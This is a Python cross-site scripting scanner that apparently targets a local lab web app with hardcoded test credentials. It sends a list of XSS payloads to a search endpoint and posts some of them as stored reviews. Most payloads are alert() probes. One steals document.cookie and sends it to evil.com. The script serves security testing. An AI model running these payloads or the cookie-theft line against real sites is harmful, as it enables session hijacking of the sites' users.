#!/usr/bin/env python3
"""xss_scanner.py - cross-site scripting tests against the target"""

import argparse
import json
import sys
import time

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

# xss payloads - mix of common evasion techniques
XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
]


def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"  xss_scanner.py - cross-site scripting tester")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def authenticate(base_url, username="john", password="password"):
    """login and return an authenticated session"""
    session = requests.Session()
    login_url = f"{base_url}/login"
    session.get(login_url, timeout=5)
    resp = session.post(login_url, data={"username": username, "password": password},
                        timeout=5, allow_redirects=True)
    if "logout" in resp.text.lower():
        print(f"{Fore.YELLOW}[*] authenticated as {username}")
        return session
    print(f"{Fore.RED}[!] authentication failed")
    return None


def test_reflected_xss(base_url):
    """test reflected xss on the search endpoint"""
    print(f"{Fore.YELLOW}[*] testing reflected XSS on search...")
    search_url = f"{base_url}/search"
    results = []

    for payload in XSS_PAYLOADS:
        try:
            resp = requests.get(search_url, params={"q": payload}, timeout=5)
            reflected = payload in resp.text

            partial = False
            if not reflected:
                core = payload.replace('"', '').replace("'", "")
                if core in resp.text:
                    partial = True

            result = {
                "type": "reflected",
                "endpoint": "/search",
                "payload": payload,
                "reflected": reflected,
                "partial": partial,
                "status_code": resp.status_code
            }
            results.append(result)

            if reflected:
                print(f"{Fore.RED}  [+] reflected: {payload[:50]}")
            elif partial:
                print(f"{Fore.YELLOW}  [~] partial reflection: {payload[:50]}")
            else:
                print(f"{Fore.GREEN}  [-] blocked: {payload[:50]}")

        except requests.ConnectionError:
            print(f"{Fore.RED}  [!] connection failed")
            break

    return results


def test_stored_xss(base_url):
    """test stored xss via the review submission form"""
    print(f"\n{Fore.YELLOW}[*] testing stored XSS via reviews...")
    results = []

    # need to be logged in to post reviews
    session = authenticate(base_url)
    if not session:
        print(f"{Fore.RED}  [!] cannot test stored xss without authentication")
        return results

    review_url = f"{base_url}/reviews/1"
    test_payloads = XSS_PAYLOADS[:8]

    for payload in test_payloads:
        try:
            # post the review with xss payload as content
            data = {"content": payload, "rating": "5"}
            resp = session.post(review_url, data=data, timeout=5,
                                allow_redirects=True)

            if resp.status_code == 200:
                # the review content is rendered with |safe, so check if payload
                # appears unescaped in the response
                stored = payload in resp.text

                result = {
                    "type": "stored",
                    "endpoint": "/reviews/1",
                    "payload": payload,
                    "stored": stored,
                    "status_code": resp.status_code
                }
                results.append(result)

                if stored:
                    print(f"{Fore.RED}  [+] stored xss: {payload[:50]}")
                else:
                    print(f"{Fore.YELLOW}  [~] submitted but escaped: {payload[:50]}")
            else:
                print(f"{Fore.YELLOW}  [*] unexpected status {resp.status_code} for: {payload[:50]}")

        except requests.ConnectionError:
            print(f"{Fore.RED}  [!] connection failed")
            break

    # also verify by doing a GET to see if stored payloads persist
    if results:
        try:
            resp = session.get(review_url, timeout=5)
            stored_count = 0
            for r in results:
                if r["payload"] in resp.text:
                    r["verified_stored"] = True
                    stored_count += 1
            if stored_count:
                print(f"{Fore.RED}  [+] verified {stored_count} stored payloads on GET")
        except requests.ConnectionError:
            pass

    return results


def test_dom_xss(base_url):
    """check for potential dom-based xss sinks"""
    print(f"\n{Fore.YELLOW}[*] checking for DOM XSS sinks...")
    results = []
    try:
        resp = requests.get(base_url, timeout=5)
        body = resp.text

        sinks = {
            "innerHTML": "innerHTML" in body,
            "document.write": "document.write" in body,
            "eval(": "eval(" in body,
            "location.hash": "location.hash" in body,
            "location.search": "location.search" in body,
            "document.URL": "document.URL" in body,
        }

        for sink, found in sinks.items():
            if found:
                print(f"{Fore.RED}  [+] potential DOM sink: {sink}")
                results.append({"sink": sink, "found": True})

        if not any(sinks.values()):
            print(f"{Fore.GREEN}  [-] no obvious DOM sinks found")

    except requests.ConnectionError:
        print(f"{Fore.RED}  [!] connection failed")

    return results


def run_xss_scan(target_url):
    """main xss scanning routine"""
    banner()
    results = {
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "reflected": [],
        "stored": [],
        "dom": []
    }

    results["reflected"] = test_reflected_xss(target_url)
    results["stored"] = test_stored_xss(target_url)
    results["dom"] = test_dom_xss(target_url)

    reflected_count = sum(1 for r in results["reflected"] if r.get("reflected"))
    stored_count = sum(1 for r in results["stored"] if r.get("stored"))
    dom_count = sum(1 for r in results["dom"] if r.get("found"))

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  xss scan complete")
    print(f"  reflected xss: {reflected_count} payloads reflected")
    print(f"  stored xss: {stored_count} payloads stored")
    print(f"  dom sinks: {dom_count} found")
    print(f"{'='*60}{Style.RESET_ALL}")

    return results


def main():
    parser = argparse.ArgumentParser(description="xss_scanner.py - xss testing")
    parser.add_argument("-t", "--target", default="http://localhost:5000",
                        help="target URL")
    parser.add_argument("-o", "--output", default="xss_results.json",
                        help="output file")
    args = parser.parse_args()

    results = run_xss_scan(args.target)

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n{Fore.GREEN}[+] results saved to {args.output}")


if __name__ == "__main__":
    main()
